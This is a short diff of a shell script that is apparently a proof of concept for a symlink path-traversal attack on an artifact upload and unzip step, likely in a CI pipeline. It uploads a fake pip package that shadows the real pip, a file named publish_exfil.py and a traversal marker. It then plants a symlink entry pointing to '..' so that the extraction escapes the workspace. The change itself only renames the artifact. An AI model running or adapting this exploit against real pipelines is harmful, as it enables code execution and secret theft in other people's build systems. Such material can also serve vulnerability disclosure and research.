@@ -8,10 +8,10 @@ if [ -f /tmp/poc_action_done ]; then
 fi
 dot=1
 p=1
-INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py && p=0
+INPUT_NAME='0' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py && p=0
 echo "POC_ACTION_P_EXIT=$p"
 sleep 3
-INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py && dot=0
+INPUT_NAME='.' INPUT_ENTRIES='[{"name":"0","content":"..","mode":41471}]' python3 poc/upload.py && dot=0
 echo "POC_ACTION_DOT_EXIT=$dot"
 if [ "$dot" = 0 ] && [ "$p" = 0 ]; then
   touch /tmp/poc_action_done
